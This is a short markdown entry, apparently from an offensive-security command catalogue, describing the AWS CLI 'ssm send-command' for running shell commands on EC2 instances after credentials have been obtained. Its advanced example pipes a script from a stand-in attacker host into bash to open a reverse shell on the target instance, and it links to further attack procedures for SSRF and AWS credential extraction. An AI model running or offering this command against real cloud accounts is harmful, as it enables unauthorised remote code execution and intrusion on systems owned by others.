---
data: >-
  aws ssm send-command --document-name "AWS-RunShellScript" --parameters
  'commands=["curl ..."]'
tags:
  - aws
  - command-execution
  - ssm
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 0d2af3a7-da61-49c8-9824-ab0b850e9faa
created_at: '2025-12-11T06:10:22.545Z'
updated_at: '2025-12-11T06:10:22.545Z'
verified: false
validated: true
submitted: true
---
# aws-ssm-send-command

## Command

```bash
aws ssm send-command --document-name "AWS-RunShellScript" --parameters 'commands=["curl ..."]'
```

## Description

This AWS CLI command sends arbitrary shell commands to EC2 instances via Systems Manager (SSM), useful for execution after obtaining credentials, such as running curl for reverse shells.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--document-name` | Specifies SSM document (e.g., AWS-RunShellScript) | Yes |
| `--parameters` | Passes commands array for execution | Yes |

## Examples

### Basic Usage

```bash
aws ssm send-command --document-name "AWS-RunShellScript" --parameters 'commands=["echo Hello World"]'
```

### Advanced Usage

```bash
aws ssm send-command --document-name "AWS-RunShellScript" --parameters 'commands=["curl http://attacker.com/reverse-shell.sh | bash"]' --instance-ids "i-1234567890abcdef0"
```

## Expected Output

JSON response with CommandId and status details for the executed command.

## Related

- [[commands/curl-inject-ssrf-iframe]]
- [[procedures/Extract-AWS-Credentials-from-Generated-PDF]]
